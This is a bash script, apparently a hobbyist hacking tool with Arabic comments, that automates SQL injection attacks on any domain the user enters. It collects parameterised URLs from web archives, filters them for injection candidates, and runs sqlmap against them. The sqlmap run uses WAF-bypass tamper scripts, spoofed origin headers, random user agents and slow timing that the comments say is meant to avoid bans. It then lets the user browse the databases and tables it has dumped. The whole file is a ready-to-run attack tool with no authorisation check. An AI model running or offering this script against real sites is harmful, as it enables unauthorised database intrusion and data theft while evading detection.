#!/bin/bash

# الألوان
G='\033[0;32m'
R='\033[0;31m'
Y='\033[1;33m'
C='\033[0;36m'
NC='\033[0m'

banner() {
    clear
    echo -e "${C}    ███████ ██████  ███████  █████  ██ "
    echo "    ██      ██   ██ ██      ██   ██ ██ "
    echo "    █████   ██████  ███████ ███████ ██ "
    echo "    ██      ██   ██      ██ ██   ██ ██ "
    echo "    ██      ██   ██ ███████ ██   ██ ███████ "
    echo -e "    ${Y}   INVISIBLE MODE (ANTI-BAN) | BY: FASIAL${NC}"
    echo -e "    ${G}GitHub: https://github.com/f-a2${NC}"
    echo -e "    ${R}--------------------------------------------${NC}"
}

banner
read -p "[?] Enter Target Domain: " target
[ -z "$target" ] && exit 1

# تنظيف وتحضير الروابط
echo -e "${Y}[*] Cleaning workspace and fetching URLs...${NC}"
rm -f all_urls.txt inject_this.txt final_targets.txt
waybackurls $target | grep "=" > inject_this.txt
gf sqli inject_this.txt > final_targets.txt 2>/dev/null || cp inject_this.txt final_targets.txt

if [ ! -s final_targets.txt ]; then
    echo -e "${R}[X] No injectable URLs found!${NC}"; exit 1
fi

echo -e "${G}[+] Found $(wc -l < final_targets.txt) potential links.${NC}"
echo -e "${Y}[!] Starting Invisible Bypass Attack (Slow & Steady)...${NC}"

# التعديلات الجديدة لتجنب الحظر والـ Timeout:
# 1. شلنا charlike اللي سبب خطأ.
# 2. حطينا --delay=3 عشان السيرفر ما يشك.
# 3. حطينا --threads=1 (الفحص الفردي أضمن لتخطى الـ WAF).
# 4. زدنا الـ --timeout لـ 60 ثانية.

sqlmap -m final_targets.txt --batch --random-agent \
--tamper=between,randomcase,space2comment,union2comment,equaltolike \
--header="X-Forwarded-For: 8.8.8.8" \
--header="X-Originating-IP: 1.1.1.1" \
--level=3 --risk=1 \
--threads=1 --delay=3 --timeout=60 \
--drop-set-cookie --dbs --output-dir="./results_$target"

# التفاعل مع النتائج
while true; do
    echo -e "\n${Y}[1] Explore DBs | [0] Exit${NC}"
    read -p "> " choice
    if [ "$choice" == "1" ]; then
        read -p "Enter DB Name: " dbname
        sqlmap -m final_targets.txt --batch --random-agent -D $dbname --tables --threads=1 --delay=2
    else
        exit 0
    fi
done
